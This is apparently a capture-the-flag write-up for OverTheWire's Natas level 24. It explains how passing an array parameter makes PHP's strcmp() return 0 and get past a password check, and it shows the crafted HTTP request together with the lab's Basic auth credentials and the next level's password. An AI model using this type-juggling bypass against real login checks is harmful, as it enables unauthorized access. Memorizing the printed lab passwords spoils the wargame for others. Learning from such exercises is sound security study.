Website prompts for a password. Website PHP code is:
```
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?> 
```

The idea here is to bypass the strcmp() check. From https://www.php.net/manual/en/function.strcmp:
> If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.

After playing with some PHP code it appears that, if `$_REQUEST["passwd"]` is an array then strcmp() may return 0. But how do we do that?

Well from https://www.php.net/manual/en/reserved.variables.post.php it says that indexed form variables names will be automatically decoded in PHP superglobals. So that's what we have to do here:
```
GET /?passwd[0]=foo HTTP/1.1
Host: natas24.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyNDoweHpGMzBUOUF2OGxnWGhXN3NsaEZDSXNWS0FQeWwycg==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas24.natas.labs.overthewire.org/?passwd=10111
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Password for next level is `ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws`.
